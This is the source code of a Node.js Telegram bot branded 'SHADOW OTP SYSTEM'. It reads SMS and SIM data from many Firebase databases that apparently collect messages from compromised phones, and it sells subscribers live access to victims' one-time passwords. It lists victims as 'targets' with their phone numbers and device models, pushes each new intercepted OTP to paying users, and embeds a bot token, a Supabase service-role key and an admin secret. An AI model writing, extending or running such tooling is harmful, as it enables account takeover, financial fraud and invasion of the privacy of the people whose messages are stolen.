const TelegramBot = require('node-telegram-bot-api');
const { initializeApp } = require('firebase/app');


const { getDatabase, ref, onChildAdded, get, set, query, limitToLast } = require('firebase/database');
const fs = require('fs');
const express = require('express');
const app = express();

const port = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is running!'));
app.listen(port, () => console.log(`Server listening on port ${port}`));

const token = '8797042079:AAE0aDd5ZQlegN2CKKWe4yG305Rvmldo308';
const bot = new TelegramBot(token, { polling: true });

let usersDB = { adminId: "6799525497", users: {} };

function isAuthorized(chatId) {
    const uid = chatId.toString();
    if (usersDB.adminId === uid) return true;
    
    const user = usersDB.users[uid];
    if (!user) return false;
    
    if (user.expiry && Date.now() > user.expiry) return false;
    return true;
}

function checkAuth(msg) {
    const chatId = msg.chat.id.toString();
    if (msg.text && (msg.text.startsWith('/claim_admin') || msg.text.startsWith('/myid'))) return true;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, "🚫 <b>ACCESS DENIED</b>\n━━━━━━━━━━━━━━━━━━\nAapka subscription active nahi hai ya aap naye user hain.\n\n💎 <b>Premium Access ke liye contact karein:</b>\n👉 @SHADOW_SELLER07", { parse_mode: 'HTML' });
        return false;
    }
    return true;
}

const rawServers = require('./servers.json');

const uniqueServers = [];
const seenUrls = new Set();
rawServers.forEach(srv => {
    if ((srv.type === 'std' || srv.type === 'v2' || srv.type === 'rto') && !seenUrls.has(srv.url)) {
        seenUrls.add(srv.url);
        uniqueServers.push(srv);
    }
});

const servers = uniqueServers.map((srv, i) => {
    return {
        id: `S_${i + 1}`,
        name: srv.label,
        url: srv.url,
        path: srv.path,
        type: srv.type,
        adminOnly: srv.adminOnly || false
    };
});

const apps = {};
const dbs = {};

servers.forEach(server => {
    try {
        const app = initializeApp({ databaseURL: server.url }, server.id);
        apps[server.id] = app;
        dbs[server.id] = getDatabase(app);
    } catch(e) {}
});

let notifiedMessages = new Set();
const { createClient } = require('@supabase/supabase-js');
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://mcaynnjedzcdmdewjcnr.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1jYXlubmplZHpjZG1kZXdqY25yIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MDE4NTk2OSwiZXhwIjoyMDk1NzYxOTY5fQ.FYZQUQqdhrc3xCLLAbYZhxK_6ek4hP30QBGTRwcvOFI';
let supabase = null;
if (SUPABASE_URL !== 'YOUR_SUPABASE_URL') {
    supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
    console.log("Supabase client initialized.");
} else {
    console.log("Supabase credentials not set!");
}

async function loadUsersDBFromSupabase() {
    if (!supabase) return;
    try {
        const { data, error } = await supabase.from('telegram_users').select('*');
        if (!error && data) {
            let loaded = { adminId: "6799525497", users: {} };
            for (let row of data) {
                if (row.is_admin) {
                    loaded.adminId = row.chat_id;
                }
                loaded.users[row.chat_id] = {
                    expiry: parseInt(row.expiry),
                    activeServerMode: row.active_server_mode || 'ALL'
                };
            }
            usersDB = loaded;
            console.log(`Loaded ${Object.keys(usersDB.users).length} users from Supabase.`);
        }
    } catch(e) {
        console.error("Failed to load users from Supabase:", e.message);
    }
}

async function saveUsersDBToSupabase() {
    if (!supabase) return;
    try {
        let rows = [];
        if (usersDB.adminId && !usersDB.users[usersDB.adminId]) {
            rows.push({
                chat_id: usersDB.adminId,
                expiry: 0,
                active_server_mode: 'ALL',
                is_admin: true
            });
        }
        for (let [uid, data] of Object.entries(usersDB.users)) {
            rows.push({
                chat_id: uid,
                expiry: data.expiry,
                active_server_mode: data.activeServerMode || 'ALL',
                is_admin: (uid === usersDB.adminId)
            });
        }
        if (rows.length > 0) {
            const { error } = await supabase.from('telegram_users').upsert(rows);
            if (error) console.error("Error saving users to Supabase:", error.message);
        }
        // Local Backup
        const { getDatabase, ref, onChildAdded, get, set, query, limitToLast } = require('firebase/database');
const fs = require('fs');
        fs.writeFileSync('./users.json', JSON.stringify(usersDB, null, 2));
    } catch(e) {
        console.error("Failed to save users to Supabase:", e.message);
    }
}

function escapeHtml(text) {
    if (!text) return '';
    return text.toString().replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function extractNumberAndCarrier(simString) {
    if (!simString) return null;
    let parts = simString.split(' - ');
    let num = parts[0];
    let carrier = parts[1] || parts[2] || '';
    if (carrier) {
        return `${num} (${carrier.trim()})`;
    }
    return num;
}

async function getWithTimeout(dbRef, timeoutMs = 1500) {
    return Promise.race([
        get(dbRef),
        new Promise((_, reject) => setTimeout(() => reject(new Error("Timeout")), timeoutMs))
    ]);
}

async function getDeviceNumbers(db, server, deviceId) {
    try {
        if (server.type === 'v2') {
            const snap = await getWithTimeout(ref(db, `user_data/${deviceId}`), 1500);
            if (snap.exists()) {
                const info = snap.val();
                let display = info.phoneNumber || "Unknown";
                if (info.Device_info) {
                    let model = info.Device_info.split('\n')[0].replace('Model: ', '').trim();
                    display += ` (${model})`;
                }
                return display;
            }
        } else if (server.type === 'rto') {
            return deviceId;
        } else {
            const snap = await getWithTimeout(ref(db, `${server.path}/SimINFO/${deviceId}`), 1500);
            if (snap.exists()) {
                const info = snap.val();
                let nums = [];
                if (info.sim1) nums.push(extractNumberAndCarrier(info.sim1));
                if (info.sim2) nums.push(extractNumberAndCarrier(info.sim2));
                
                nums = nums.filter(n => n && n.trim() !== '');
                if (nums.length > 0) return nums.join(' | ');
            }
        }
    } catch (e) {}
    return "Unknown Number"; 
}

function getServerMenu(chatId) {
    let kb = [];
    let row = [];
    servers.forEach((s) => {
        if (s.adminOnly && chatId !== usersDB.adminId) return;
        row.push({ text: s.name, callback_data: `sel_${s.id}` });
        if (row.length === 3) { kb.push(row); row = []; }
    });
    if (row.length > 0) kb.push(row);
    kb.push([{ text: "🌐 ALL SHADOWS (Global Mode)", callback_data: `sel_ALL` }]);
    return kb;
}

function chunkArray(array, size) {
    const chunked = [];
    let index = 0;
    while (index < array.length) {
        chunked.push(array.slice(index, size + index));
        index += size;
    }
    return chunked;
}

async function fetchAllNumbersFromAllServers(chatId) {
    let allButtons = [];
    const promises = servers.map(async (server) => {
        if (server.adminOnly && chatId !== usersDB.adminId) return;
        const db = dbs[server.id];
        if (!db) return;
        try {
            const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
            const snapshot = await getWithTimeout(ref(db, basePath), 1500);
            if (snapshot.exists()) {
                const deviceIds = Object.keys(snapshot.val());
                const devPromises = deviceIds.map(async (did) => {
                    const num = await getDeviceNumbers(db, server, did);
                    return { text: `📱 ${num} [${server.name}]`, callback_data: `otp_${server.id}_${did}` };
                });
                const buttons = await Promise.all(devPromises);
                allButtons.push(...buttons);
            }
        } catch (e) {}
    });
    await Promise.allSettled(promises);
    return allButtons;
}

async function sendServerNumbers(chatId, serverId, serverName) {
    try {
        const server = servers.find(s => s.id === serverId);
        const db = dbs[serverId];
        if (!db) return bot.sendMessage(chatId, "Database not found for " + serverName);
        
        const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
        const snapshot = await getWithTimeout(ref(db, basePath), 1500);
        if (snapshot.exists()) {
            const deviceIds = Object.keys(snapshot.val());
            const devPromises = deviceIds.map(async (did) => {
                const num = await getDeviceNumbers(db, server, did);
                return { text: `📱 ${num}`, callback_data: `otp_${serverId}_${did}` };
            });
            const buttons = await Promise.all(devPromises);
            sendChunkedKeyboards(chatId, buttons, `<b>${serverName} Numbers:</b>`);
        } else {
            bot.sendMessage(chatId, `No numbers found in <b>${serverName}</b>.`, { parse_mode: 'HTML' });
        }
    } catch (error) {
        bot.sendMessage(chatId, `Error in ${serverName}: ` + error.message);
    }
}

function sendChunkedKeyboards(chatId, flatButtons, title) {
    const rows = flatButtons.map(btn => [btn]);
    const chunkedRows = chunkArray(rows, 80);
    chunkedRows.forEach((keyboardChunk, idx) => {
        const partText = chunkedRows.length > 1 ? ` (Part ${idx + 1})` : '';
        bot.sendMessage(chatId, `${title}${partText}\nKisi bhi number par click karein:`, { 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: keyboardChunk }
        });
    });
}

// ---------------- ADMIN COMMANDS ----------------

bot.onText(/\/myid/, (msg) => {
    bot.sendMessage(msg.chat.id, `Your Telegram ID is: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' });
});

bot.onText(/\/claim_admin (.+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    const secret = match[1];
    
    if (usersDB.adminId) {
        return bot.sendMessage(chatId, "Admin is already claimed!");
    }
    if (secret === "shadow_admin_007") {
        usersDB.adminId = chatId;
        if (!usersDB.users[chatId]) {
            usersDB.users[chatId] = { expiry: null, activeServerMode: 'ALL' };
        }
        saveUsersDBToSupabase();
        bot.sendMessage(chatId, "👑 <b>ADMIN ACCESS GRANTED</b>\n━━━━━━━━━━━━━━━━━━\nWelcome back, Admin.\n\n🛠 <b>COMMAND PANEL:</b>\n<code>/adduser <id> <time></code> ➜ Grant access (e.g., 2d, 12h, 30m)\n<code>/deluser <id></code> ➜ Revoke access\n<code>/users</code> ➜ Active User List\n<code>/all</code> ➜ Global OTP Mode", { parse_mode: 'HTML' });
    } else {
        bot.sendMessage(chatId, "❌ <b>Error:</b> Invalid Secret Key!");
    }
});

bot.onText(/\/adduser (\d+)\s+(\d+)([a-zA-Z]*)/i, (msg, match) => {
    if (!checkAuth(msg)) return;
    const chatId = msg.chat.id.toString();
    if (chatId !== usersDB.adminId) return bot.sendMessage(chatId, "You are not the admin.");
    
    const targetId = match[1];
    const amount = parseInt(match[2]);
    const unit = (match[3] || 'd').toLowerCase();
    
    let multiplier = 24 * 60 * 60 * 1000; // default to days
    let unitName = "days";
    if (unit === 'h') {
        multiplier = 60 * 60 * 1000; // hours
        unitName = "hours";
    } else if (unit === 'm') {
        multiplier = 60 * 1000; // minutes (for testing if you want)
        unitName = "minutes";
    }
    
    const expiry = Date.now() + (amount * multiplier);
    
    if (!usersDB.users[targetId]) {
        usersDB.users[targetId] = { activeServerMode: 'ALL' };
    }
    usersDB.users[targetId].expiry = expiry;
    saveUsersDBToSupabase();
    
    bot.sendMessage(chatId, `✅ <b>USER ADDED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>ID:</b> <code>${targetId}</code>\n⏳ <b>Duration:</b> ${amount} ${unitName}`, { parse_mode: 'HTML' });
    bot.sendMessage(targetId, `🎉 <b>SUBSCRIPTION ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━\nWelcome to Premium! Aapka access <b>${amount} ${unitName}</b> ke liye activate ho gaya hai.\n\n🚀 Click /start to begin.`, { parse_mode: 'HTML' }).catch(e=>{});
});

bot.onText(/\/deluser (\d+)/, (msg, match) => {
    if (!checkAuth(msg)) return;
    const chatId = msg.chat.id.toString();
    if (chatId !== usersDB.adminId) return bot.sendMessage(chatId, "You are not the admin.");
    
    const targetId = match[1];
    if (usersDB.users[targetId]) {
        delete usersDB.users[targetId];
        saveUsersDBToSupabase();
        bot.sendMessage(chatId, `🗑 <b>USER REMOVED</b>\n━━━━━━━━━━━━━━━━━━\n👤 <b>ID:</b> <code>${targetId}</code> has been revoked.`, { parse_mode: 'HTML' });
        bot.sendMessage(targetId, `🚫 <b>ACCESS EXPIRED</b>\n━━━━━━━━━━━━━━━━━━\nAapka premium access band kar diya gaya hai.\n\n💎 <b>Renew karne ke liye contact karein:</b>\n👉 @SHADOW_SELLER07`, { parse_mode: 'HTML' }).catch(e=>{});
    } else {
        bot.sendMessage(chatId, "User not found.");
    }
});

bot.onText(/\/users/, (msg) => {
    if (!checkAuth(msg)) return;
    const chatId = msg.chat.id.toString();
    if (chatId !== usersDB.adminId) return;
    
    let reply = "📊 <b>USER DASHBOARD</b>\n━━━━━━━━━━━━━━━━━━\n\n";
    let count = 0;
    for (const [uid, data] of Object.entries(usersDB.users)) {
        if (uid === usersDB.adminId) {
            reply += `👑 <b>Admin:</b> <code>${uid}</code>\n\n`;
        } else {
            count++;
            const expStr = data.expiry ? new Date(data.expiry).toLocaleString() : 'Never';
            const status = (data.expiry && Date.now() > data.expiry) ? '❌ Expired' : '✅ Active';
            reply += `👤 <b>User:</b> <code>${uid}</code>\n⏳ <b>Expiry:</b> ${expStr} [${status}]\n\n`;
        }
    }
    if (count === 0) reply += "No other users.";
    bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
});

bot.onText(/\/start/, (msg) => {
    if (!checkAuth(msg)) return;
    const chatId = msg.chat.id.toString();
    bot.sendMessage(chatId, "⚡️ <b>SHADOW OTP SYSTEM</b> ⚡️\n━━━━━━━━━━━━━━━━━━\nWelcome to the premium dashboard. Please select a server to monitor, or choose <b>ALL SHADOWS</b> for global interception.", { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: getServerMenu(chatId)
        }
    });
});

bot.onText(/\/all/, async (msg) => {
    if (!checkAuth(msg)) return;
    const chatId = msg.chat.id.toString();
    if (usersDB.users[chatId]) {
        usersDB.users[chatId].activeServerMode = 'ALL';
        saveUsersDBToSupabase();
    }
    
    bot.sendMessage(chatId, "⏳ <i>Initializing Global Intercept Mode...</i>", { parse_mode: 'HTML' });
    
    const allButtons = await fetchAllNumbersFromAllServers(chatId);
    if (allButtons.length > 0) {
        bot.sendMessage(chatId, "🌐 <b>GLOBAL MODE ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━\nAapko sabhi servers ke live OTPs real-time mein milenge.", { parse_mode: 'HTML' });
        sendChunkedKeyboards(chatId, allButtons, "📱 <b>AVAILABLE TARGETS:</b>");
    } else {
        bot.sendMessage(chatId, "⚠️ <b>System Alert:</b> No active targets found in the database.");
    }
});

// Handle callback queries
bot.on('callback_query', async (query) => {
    bot.answerCallbackQuery(query.id).catch(e => {});

    const chatId = query.message.chat.id.toString();
    if (!isAuthorized(chatId)) {
        return bot.sendMessage(chatId, "⚠️ <b>Aapka access band ho gaya hai ya aap naye user hain.</b>\nAccess kharidne ke liye contact karein: @SHADOW_SELLER07", { parse_mode: 'HTML' });
    }

    const data = query.data;
    
    if (data.startsWith('sel_')) {
        const srvId = data.replace('sel_', '');
        if (usersDB.users[chatId]) {
            usersDB.users[chatId].activeServerMode = srvId;
            saveUsersDBToSupabase();
        }
        
        if (srvId === 'ALL') {
            bot.sendMessage(chatId, "⏳ <i>Initializing Global Intercept Mode...</i>", { parse_mode: 'HTML' });
            const allButtons = await fetchAllNumbersFromAllServers(chatId);
            bot.sendMessage(chatId, "🌐 <b>GLOBAL MODE ACTIVATED</b>\n━━━━━━━━━━━━━━━━━━\nAapko sabhi servers ke live OTPs real-time mein milenge.", { parse_mode: 'HTML' });
            if (allButtons.length > 0) {
                sendChunkedKeyboards(chatId, allButtons, "📱 <b>AVAILABLE TARGETS:</b>");
            } else {
                bot.sendMessage(chatId, "⚠️ <b>System Alert:</b> No active targets found in the database.");
            }
        } else {
            const server = servers.find(s => s.id === srvId);
            if (server.adminOnly && chatId !== usersDB.adminId) {
                return bot.sendMessage(chatId, "⚠️ <b>ACCESS DENIED</b>\nYou do not have permission to access this server.", { parse_mode: 'HTML' });
            }
            bot.sendMessage(chatId, `⏳ <i>Connecting to ${server.name}...</i>`, { parse_mode: 'HTML' });
            bot.sendMessage(chatId, `🎯 <b>TARGET LOCKED: ${server.name}</b>\n━━━━━━━━━━━━━━━━━━\nAb aapko sirf ${server.name} ke live OTPs milenge.`, { parse_mode: 'HTML' });
            await sendServerNumbers(chatId, server.id, server.name);
        }
    } 
    else if (data.startsWith('otp_')) {
        const parts = data.split('_');
        const srvId = parts[1] + '_' + parts[2]; 
        const deviceId = parts.slice(3).join('_'); 
        
        try {
            const server = servers.find(s => s.id === srvId);
            const db = dbs[srvId];
            const deviceNum = await getDeviceNumbers(db, server, deviceId);
            const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : (server.type === 'rto' ? `${server.path || 'All_Users/sms'}/${deviceId}` : `${server.path}/Sms/${deviceId}`);
            const snapshot = await getWithTimeout(ref(db, basePath), 4000);
            
            if (snapshot.exists()) {
                const messages = snapshot.val();
                let allMsgs = [];
                for (const [msgId, msgData] of Object.entries(messages)) {
                    if ((server.type === 'v2' || server.type === 'rto') && msgData && msgData.body) {
                        allMsgs.push({
                            msg: msgData.body,
                            ph: msgData.sender,
                            date: msgData.timestamp ? parseInt(msgData.timestamp) : (msgData.receivedDate ? new Date(msgData.receivedDate).getTime() : 0)
                        });
                    } else if (msgData && msgData.msg) {
                        allMsgs.push({
                            msg: msgData.msg,
                            ph: msgData.ph,
                            date: parseInt(msgData.date || 0)
                        });
                    }
                }
                allMsgs.sort((a, b) => b.date - a.date);
                const recent = allMsgs.slice(0, 5); 
                
                if (recent.length === 0) {
                    return bot.sendMessage(chatId, `No OTPs found for ${deviceNum}.`);
                }
                
                let reply = `<b>[${server.name}] Recent OTPs for ${escapeHtml(deviceNum)}:</b>\n\n`;
                for (let i = 0; i < recent.length; i++) {
                    const m = recent[i];
                    const dt = new Date(m.date).toLocaleString();
                    reply += `<b>From:</b> ${escapeHtml(m.ph)}\n<b>Time:</b> ${escapeHtml(dt)}\n<b>Message:</b> ${escapeHtml(m.msg)}\n\n`;
                }
                bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
            } else {
                bot.sendMessage(chatId, "No OTPs found for this number.");
            }
        } catch (e) {
            bot.sendMessage(chatId, "Error fetching OTPs.");
        }
    }
});

const botStartTime = Date.now();

async function setupLiveListeners() {
    console.log(`Setting up live listeners on ${servers.length} Firebase servers...`);
    
    servers.forEach(async (server) => {
        const db = dbs[server.id];
        if (!db) return;
        
        try {
            const basePath = server.type === 'v2' ? 'user_sms' : (server.type === 'rto' ? (server.path || 'All_Users/sms') : `${server.path}/Sms`);
            const devicesRef = ref(db, basePath);
            
            // Just attach onChildAdded, it triggers for all existing devices and future ones
            onChildAdded(devicesRef, (deviceSnapshot) => {
                const deviceId = deviceSnapshot.key;
                attachListenerToDevice(db, server, deviceId);
            });
        } catch(e) {}
    });
}

function attachListenerToDevice(db, server, deviceId) {
    const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : (server.type === 'rto' ? `${server.path || 'All_Users/sms'}/${deviceId}` : `${server.path}/Sms/${deviceId}`);
    const msgsRef = ref(db, basePath);
    const latestQuery = query(msgsRef, limitToLast(1));
    
    onChildAdded(latestQuery, async (msgSnapshot) => {
        const msgId = msgSnapshot.key;
        const msgData = msgSnapshot.val();
        
        let msgText, msgPh, msgDate;
        if ((server.type === 'v2' || server.type === 'rto') && msgData && msgData.body) {
            msgText = msgData.body;
            msgPh = msgData.sender;
            msgDate = msgData.timestamp ? parseInt(msgData.timestamp) : (msgData.receivedDate ? new Date(msgData.receivedDate).getTime() : 0);
        } else if (msgData && msgData.msg) {
            msgText = msgData.msg;
            msgPh = msgData.ph;
            msgDate = parseInt(msgData.date || 0);
        }
        
        if (msgText) {
            
            // Ignore messages loaded during the first 15 seconds of bot startup
            if (Date.now() - botStartTime < 15000) {
                notifiedMessages.add(msgId);
                return;
            }

            if (!notifiedMessages.has(msgId)) {
                notifiedMessages.add(msgId);
                
                const dt = new Date(msgDate).toLocaleString();
                const deviceNum = await getDeviceNumbers(db, server, deviceId);
                const alertMsg = `🔥 <b>New OTP [${server.name}]</b> 🔥\n\n<b>To Number:</b> <code>${escapeHtml(deviceNum)}</code>\n<b>From:</b> ${escapeHtml(msgPh)}\n<b>Time:</b> ${escapeHtml(dt)}\n\n<b>Message:</b>\n${escapeHtml(msgText)}`;
                
                // Broadcast to all authorized users subscribed to this server
                for (const [uid, data] of Object.entries(usersDB.users)) {
                    if (isAuthorized(uid)) {
                        if (server.adminOnly && uid !== usersDB.adminId) continue;
                        if (data.activeServerMode === 'ALL' || data.activeServerMode === server.id) {
                            bot.sendMessage(uid, alertMsg, { parse_mode: 'HTML' }).catch(e => {});
                        }
                    }
                }
            }
        }
    });
}

async function startBot() {
    await loadUsersDBFromSupabase();
    
    if (Object.keys(usersDB.users).length === 0 && fs.existsSync('users.json')) {
        const data = fs.readFileSync('users.json');
        usersDB = JSON.parse(data);
        console.log("Loaded users from fallback users.json");
    }

    await setupLiveListeners();
    console.log("Telegram Multi-User SaaS Bot is running!");
}

startBot();
